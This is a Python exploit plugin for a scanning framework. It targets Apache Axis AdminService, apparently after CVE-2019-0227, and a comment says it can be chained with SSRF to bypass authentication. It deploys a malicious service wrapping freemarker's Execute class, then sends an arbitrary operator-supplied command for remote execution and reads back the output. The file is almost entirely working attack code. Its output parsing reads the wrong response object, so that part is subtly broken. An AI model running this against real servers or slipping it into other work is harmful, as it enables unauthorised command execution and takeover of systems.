#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

"""
配合SSRF可绕过远程的身份认证
https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2019-0227/CVE-2019-0227.py
"""

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'axis2_getshell'
        self.keyword = ['axis2']
        self.info = 'axis2 <=1.4 getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/axis2/services/AdminService?wsdl'),
                self.url_normpath(self.base_url, './services/AdminService?wsdl'),
                self.url_normpath(self.base_url, './axis/services/AdminService?wsdl'),
                self.url_normpath(self.url, './services/AdminService?wsdl'),
                self.url_normpath(self.url, './axis2/services/AdminService?wsdl'),
                self.url_normpath(self.url, './axis/services/AdminService?wsdl'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path
                    headers = {'Content-Type': 'text/xml; charset=utf-8','SOAPAction': '""'}
                    data = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soapenv:Body>
<deployment xmlns="http://xml.apache.org/axis/wsdd/"
xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
<service name="freemarker" provider="java:RPC">
<parameter name="className" value="freemarker.template.utility.Execute"/>
<parameter name="allowedMethods" value="*"/>
</service>
</deployment>
</soapenv:Body></soapenv:Envelope>
    '''
                    async with session.post(url=url, data=data,headers=headers) as res:
                        if res!=None and res.status:
                            text = await res.text()
                            if  'Done processing' in text:
                                self.flag = 1
                                self.res.append({"info": url, "key": "axis2 1.4 rce"})
                                break

    async def exec(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/axis2/services/AdminService?wsdl'),
                self.url_normpath(self.base_url, './services/AdminService?wsdl'),
                self.url_normpath(self.url, './services/AdminService?wsdl'),
                self.url_normpath(self.url, './axis2/services/AdminService?wsdl'),
            ]))
            async with ClientSession() as session:
                command = self.parameter['cmd']
                for path in path_list:
                    url = path
                    headers = {'Content-Type': 'text/xml; charset=utf-8','SOAPAction': '""'}
                    data = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soapenv:Body>
<deployment xmlns="http://xml.apache.org/axis/wsdd/"
xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
<service name="freemarker" provider="java:RPC">
<parameter name="className" value="freemarker.template.utility.Execute"/>
<parameter name="allowedMethods" value="*"/>
</service>
</deployment>
</soapenv:Body></soapenv:Envelope>
'''

                    async with session.post(url=url, data=data, headers=headers) as res:
                        if res!=None and  res.status==200:
                            text = await res.text()
                            if 'Done processing' in text:
                                url1 = url.replace('/services/AdminService?wsdl','/services/freemarker?wsdl')
                                data1 = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><arg0 href="#id0"/></exec><multiRef id="id0" soapenc:root="0" soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" soapenc:arrayType="xsd:anyType[1]" xsi:type="soapenc:Array" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"><multiRef xsi:type="soapenc:string">''' +command + '''</multiRef></multiRef></soapenv:Body></soapenv:Envelope>'''

                                async with session.post(url=url1, data=data1, headers=headers) as res1:
                                    if res1 != None and res1.status == 200 :
                                        text1 = await res.text()
                                        m = re.search('<execReturn.*>(.*)[\s]+<\/execReturn>', text1)
                                        if m != None and m.group(1):
                                            self.flag = 1
                                            self.res.append({"info": url, "key": m.group(1)})
                                            break
